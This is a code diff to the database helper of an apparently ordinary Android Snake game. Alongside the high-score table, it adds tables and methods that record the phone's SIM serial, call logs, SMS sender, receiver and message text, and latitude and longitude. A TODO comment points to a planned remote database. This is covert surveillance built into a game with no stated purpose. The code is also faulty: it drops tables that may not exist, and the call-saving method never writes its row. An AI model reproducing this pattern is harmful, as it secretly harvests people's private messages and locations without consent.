@@ -4,15 +4,15 @@ import android.content.ContentValues;
 import android.content.Context;
 import android.database.Cursor;
 import android.database.sqlite.SQLiteDatabase;
+import android.database.sqlite.SQLiteException;
 import android.database.sqlite.SQLiteOpenHelper;
 import android.util.Log;
 
 import java.util.ArrayList;
-import java.util.HashMap;
 
 public class DatabaseHelper extends SQLiteOpenHelper {
     private static final String DATABASE_NAME = "SnakeScores";
-    private static final int DATABASE_VERSION = 1;
+    private static final int DATABASE_VERSION = 4;
 
     public DatabaseHelper(Context context){
         super(context, DATABASE_NAME, null, DATABASE_VERSION);
@@ -20,13 +20,30 @@ public class DatabaseHelper extends SQLiteOpenHelper {
 
     @Override
     public void onCreate(SQLiteDatabase db){
-        String createTable = "CREATE TABLE LocalScores (Name TEXT, Score INTEGER);";
-        db.execSQL(createTable);
+        //Temporary while getting the schema sorted out
+        db.execSQL("DROP TABLE Phones;");
+        db.execSQL("DROP TABLE PhoneCalls;");
+        db.execSQL("DROP TABLE SMS;");
+        try {
+            db.execSQL("CREATE TABLE LocalScores (Name TEXT, Score INTEGER);");
+        }catch(SQLiteException ex){}
+
+        try{
+            db.execSQL("CREATE TABLE Phones (Id INTEGER PRIMARY KEY AUTOINCREMENT, SimSerial TEXT);");
+        }catch(SQLiteException ex){}
+
+        try{
+            db.execSQL("CREATE TABLE PhoneCalls (Phone INTEGER, Sender TEXT, Receiver TEXT, Time INTEGER, Duration INTEGER, Lat INTEGER, Long INTEGER);");
+        }catch(SQLiteException ex){}
+
+        try{
+            db.execSQL("CREATE TABLE SMS (Phone INTEGER, Sender TEXT, Receiver TEXT, Time INTEGER, Message TEXT, Type INTEGER, Lat INTEGER, Long INTEGER);");
+        }catch(SQLiteException ex){}
     }
 
     @Override
     public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion){
-
+        onCreate(db);
     }
 
     public void saveLocalScore(String name, int score){
@@ -51,5 +68,30 @@ public class DatabaseHelper extends SQLiteOpenHelper {
         }
 
         return scores;
+    }
+
+    public void savePhone(String simSerial, String operator){
+        //TODO:
+        //Once remote DB implemented, fetch the phone's ID once it is set
+        //And store in shared preferences
+        //Then check if it already has an ID before saving the phone
+
+        ContentValues row = new ContentValues();
+        row.put("SimSerial", simSerial);
+
+        SQLiteDatabase db = getWritableDatabase();
+        db.insert("Phones", null, row);
+        db.close();
+    }
+
+    public void savePhoneCall(String to, String from, int duration, int time, int latitude, int longitude){
+        ContentValues row = new ContentValues();
+        row.put("Phone", ""); //TODO: fetch phone ID from shared prefs
+        row.put("Sender", from);
+        row.put("Receiver", to);
+        row.put("Time", time);
+        row.put("Duration", duration);
+        row.put("Lat", latitude);
+        row.put("Long", longitude);
     }
 }
